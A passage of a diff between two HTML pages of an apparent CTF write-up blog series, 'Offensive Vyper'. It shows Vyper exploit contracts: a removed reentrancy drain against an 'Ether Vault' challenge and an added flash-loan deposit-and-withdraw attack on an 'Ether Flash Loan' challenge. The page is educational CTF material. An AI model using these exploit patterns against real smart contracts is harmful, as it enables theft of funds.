 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 <pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># YOUR EXPLOIT HERE</span>
 </span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
 </span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">run</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#000">amount</span>: <span style="color:#000">uint256</span> = <span style="color:#000">self</span>.<span style="color:#000">target</span>.<span style="color:#000">balance</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">Etherflashloan</span>(<span style="color:#000">self</span>.<span style="color:#000">target</span>).<span style="color:#000">flash_loan</span>(<span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">Etherflashloan</span>(<span style="color:#000">self</span>.<span style="color:#000">target</span>).<span style="color:#000">withdraw</span>(<span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">execute</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice This is the interface the Flash Loan Pool will try to call.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    Changing the external interface of this function will revert.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#000">raw_call</span>(
 </span></span><span style="display:flex;"><span>        <span style="color:#000">self</span>.<span style="color:#000">target</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#000">_abi_encode</span>(<span style="color:#5a2">&#34;&#34;</span>, <span style="color:#000">method_id</span>=<span style="color:#000">method_id</span>(<span style="color:#5a2">&#34;deposit()&#34;</span>)),
 </span></span><span style="display:flex;"><span>        <span style="color:#000">value</span>=<span style="color:#000">msg</span>.<span style="color:#000">value</span>
 </span></span><span style="display:flex;"><span>    )
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">Ethervault</span>(<span style="color:#000">self</span>.<span style="color:#000">target</span>).<span style="color:#000">withdraw</span>()
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
 </span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
 </span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">__default__</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#00f">if</span> <span style="color:#000">self</span>.<span style="color:#000">target</span>.<span style="color:#000">balance</span> &gt; <span style="color:#3af">0</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#000">Ethervault</span>(<span style="color:#000">self</span>.<span style="color:#000">target</span>).<span style="color:#000">withdraw</span>()</span></span></code></pre></td></tr></table>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">pass</span>
+</span></span><span style="display:flex;"><span>    </span></span></code></pre></td></tr></table>
 </div>
 </div></p>
-<p>You can find the complete code <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/ether-vault.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/EtherVaultExploit.vy" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<p>You can find the complete code <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/ether-flash-loan.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/EtherFlashLoanExploit.vy" target="_blank" rel="noopener noreffer ">here</a>.</p>
 <h2 id="4-references">4) References</h2>
 <ul>
-<li><a href="https://swcregistry.io/docs/SWC-107" target="_blank" rel="noopener noreffer ">SWC-107 - Reentrancy</a></li>
+<li><a href="https://vyper.readthedocs.io/en/v0.3.7/control-structures.html?highlight=nonreentrant#re-entrancy-locks" target="_blank" rel="noopener noreffer ">Re-entrancy Locks</a></li>
 </ul></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on September 29, 2022</span>
+                <span>Updated on October 1, 2022</span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/offensivevyper_03_ethervault/" data-title="Offensive Vyper - Challenge 3 - Ether Vault" data-via="_d3lla_" data-hashtags="Offensive Vyper,CTF,Vyper,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/offensivevyper_03_ethervault/" data-hashtag="Offensive Vyper"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/offensivevyper_03_ethervault/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/offensivevyper_04_etherflashloan/" data-title="Offensive Vyper - Challenge 4 - Ether Flash Loan" data-via="_d3lla_" data-hashtags="Offensive Vyper,CTF,Vyper,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/offensivevyper_04_etherflashloan/" data-hashtag="Offensive Vyper"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/offensivevyper_04_etherflashloan/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
@@ -332,8 +402,7 @@
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/offensivevyper_02_coinflipper/" class="prev" rel="prev" title="Offensive Vyper - Challenge 2 - Coin Flipper"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Offensive Vyper - Challenge 2 - Coin Flipper</a>
-            <a href="/posts/offensivevyper_04_etherflashloan/" class="next" rel="next" title="Offensive Vyper - Challenge 4 - Ether Flash Loan">Offensive Vyper - Challenge 4 - Ether Flash Loan<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/posts/offensivevyper_03_ethervault/" class="prev" rel="prev" title="Offensive Vyper - Challenge 3 - Ether Vault"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Offensive Vyper - Challenge 3 - Ether Vault</a></div>
 </div>
 </article></div>
             </main><footer class="footer">
